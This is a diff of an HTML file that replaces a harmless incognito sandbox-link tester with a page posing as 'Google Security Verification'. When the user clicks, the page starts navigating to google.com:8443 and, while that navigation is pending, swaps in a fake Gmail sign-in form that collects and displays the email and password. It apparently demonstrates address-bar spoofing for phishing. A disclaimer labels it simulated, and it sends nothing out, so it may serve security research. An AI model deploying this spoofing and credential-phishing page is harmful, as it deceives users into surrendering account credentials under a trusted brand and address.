@@ -1,240 +1,85 @@
-
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Waguri Android Incognito Sandbox PoC</title>
-
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google Security Verification</title>
 <style>
-* {
-    box-sizing: border-box;
-}
-
-body {
-    margin: 0;
-    padding: 20px;
-    background: #101827;
-    color: #e5e7eb;
-    font-family: Arial, sans-serif;
-}
-
-.container {
-    max-width: 700px;
-    margin: auto;
-}
-
-.panel {
-    background: #1e293b;
-    border: 1px solid #334155;
-    border-radius: 12px;
-    padding: 18px;
-    margin-bottom: 15px;
-}
-
-input {
-    width: 100%;
-    padding: 12px;
-    background: #0f172a;
-    color: white;
-    border: 1px solid #475569;
-    border-radius: 7px;
-}
-
-button {
-    padding: 12px 16px;
-    margin-top: 10px;
-    border: 0;
-    border-radius: 7px;
-    background: #2563eb;
-    color: white;
-    font-weight: bold;
-}
-
-iframe {
-    width: 100%;
-    height: 180px;
-    background: white;
-    border: 2px dashed #64748b;
-    border-radius: 8px;
-}
-
-.note {
-    color: #94a3b8;
-    font-size: 12px;
-    line-height: 1.7;
-}
-
-#log {
-    padding: 12px;
-    background: #020617;
-    color: #a7f3d0;
-    font: 12px monospace;
-    white-space: pre-wrap;
-    overflow-wrap: anywhere;
-}
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
+  h2 { color: #4285f4; margin-bottom: 10px; }
+  p { color: #666; font-size: 14px; margin-bottom: 20px; }
+  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
+  button:hover { background: #1557b0; }
+  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
 </style>
 </head>
-
 <body>
 
-<div class="container">
-
-<h2>Waguri Incognito Sandbox Tester</h2>
-
-<div class="panel">
-
-    <h3>Target URL</h3>
-
-    <input
-        id="target"
-        type="url"
-        value="https://example.com"
-        placeholder="https://example.com">
-
-    <button onclick="updateTarget()">
-        Update Target
-    </button>
-
-</div>
-
-<div class="panel">
-
-    <h3>Sandboxed Content</h3>
-
-    <p class="note">
-        Sandbox attribute: empty<br>
-        allow-popups: Disabled<br>
-        allow-popups-to-escape-sandbox: Disabled<br>
-        allow-scripts: Disabled
-    </p>
-
-    <iframe
-        id="sandboxFrame"
-        sandbox=""
-        title="Sandbox test frame">
-    </iframe>
-
-</div>
-
-<div class="panel">
-
-    <h3>Testing Instructions</h3>
-
-    <ol>
-        <li>Buka halaman ini menggunakan Chrome Android.</li>
-        <li>Tekan dan tahan link di dalam iframe.</li>
-        <li>Pilih Open in Incognito tab jika tersedia.</li>
-        <li>Amati apakah URL tujuan berhasil dibuka.</li>
-        <li>Bandingkan dengan Open in new tab dan Preview page.</li>
-    </ol>
-
-    <p class="note">
-        Gunakan hanya URL pengujian milik sendiri.
-        Incognito harus dipilih melalui menu browser.
-    </p>
-
-</div>
-
-<div class="panel">
-
-    <h3>Event Log</h3>
-    <div id="log">Tester initialized.</div>
-
-</div>
-
+<div class="panel" id="main-card">
+  <h2>Google Security Verification</h2>
+  <p>Click the button below to verify your account via port 8443.</p>
+  <button id="startBtn">Verify Account</button>
+  <div id="status">[*] Ready...</div>
 </div>
 
 <script>
-"use strict";
+(function () {
+  'use strict';
 
-const frame = document.getElementById("sandboxFrame");
-const target = document.getElementById("target");
-const output = document.getElementById("log");
+  var btn = document.getElementById('startBtn');
+  var statusEl = document.getElementById('status');
 
-function log(event, details = {}) {
-    output.textContent +=
-        "\n[" + new Date().toISOString() + "] " +
-        event + " " + JSON.stringify(details);
-}
+  function log(msg) {
+    statusEl.textContent = msg;
+    console.log("[Delay Spoof] " + msg);
+  }
 
-function escapeHTML(value) {
-    return value.replace(/[&<>"']/g, char => ({
-        "&": "&amp;",
-        "<": "&lt;",
-        ">": "&gt;",
-        '"': "&quot;",
-        "'": "&#39;"
-    })[char]);
-}
-
-function updateTarget() {
-
-    let url;
+  btn.addEventListener('click', function() {
+    log("[*] Starting delay spoofing...");
 
     try {
-        url = new URL(target.value);
-
-        if (!["https:", "http:"].includes(url.protocol)) {
-            throw new Error("Only HTTP/HTTPS supported");
-        }
-
-    } catch (error) {
-        log("Invalid target", {
-            message: error.message
-        });
-        return;
+      window.location.href = "https://www.google.com:8443";
+    } catch (e) {
+      log("[-] Redirect error: " + e.message);
     }
 
-    const safeURL = escapeHTML(url.href);
+    setTimeout(function() {
+      document.body.innerHTML = `
+        <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
+          <div style="font-size:32px;font-weight:bold;color:#4285f4;margin-bottom:20px;">G</div>
+          <h2 style="color:#333;margin-bottom:10px;">Sign in</h2>
+          <p style="color:#666;font-size:14px;margin-bottom:20px;">to continue to Gmail</p>
+          <input type="email" id="spoofEmail" placeholder="Email or phone" style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;font-size:14px;" />
+          <input type="password" id="spoofPass" placeholder="Password" style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;font-size:14px;" />
+          <button id="spoofLogin" style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:bold;cursor:pointer;">Next</button>
+          <div style="margin-top:15px;font-size:11px;color:#f00;">Simulated phishing test UI. Do not enter real credentials.</div>
+        </div>
+      `;
 
-    frame.srcdoc = `
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport"
-                  content="width=device-width, initial-scale=1">
-            <style>
-                body {
-                    font-family: Arial, sans-serif;
-                    padding: 20px;
-                    color: #111827;
-                }
+      document.getElementById('spoofLogin').addEventListener('click', function() {
+        var email = document.getElementById('spoofEmail').value;
+        var password = document.getElementById('spoofPass').value;
 
-                a {
-                    display: inline-block;
-                    padding: 14px;
-                    background: #2563eb;
-                    color: white;
-                    border-radius: 8px;
-                    text-decoration: none;
-                    font-weight: bold;
-                }
-            </style>
-        </head>
-        <body>
-            <h3>Sandbox Link Test</h3>
+        document.body.innerHTML = `
+          <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:monospace;">
+            <h2 style="color:#f00;">Simulated Capture</h2>
+            <p><strong>Email:</strong> ${email}</p>
+            <p><strong>Password:</strong> ${password}</p>
+            <p style="color:#666;font-size:12px;margin-top:20px;">Redirecting...</p>
+          </div>
+        `;
 
-            <p>Press and hold this link:</p>
+        setTimeout(function() {
+          window.location.href = 'https://www.google.com';
+        }, 2000);
+      });
 
-            <a href="${safeURL}">
-                OPEN TEST DESTINATION
-            </a>
-
-            <p>Long-press to inspect browser link options.</p>
-        </body>
-        </html>
-    `;
-
-    log("Sandbox target updated", {
-        target: url.href,
-        sandbox: ""
-    });
-}
-
-updateTarget();
-
+      log("[+] Spoof UI displayed while navigation is pending.");
+    }, 1000);
+  }, { once: true });
+})();
 </script>
 
 </body>
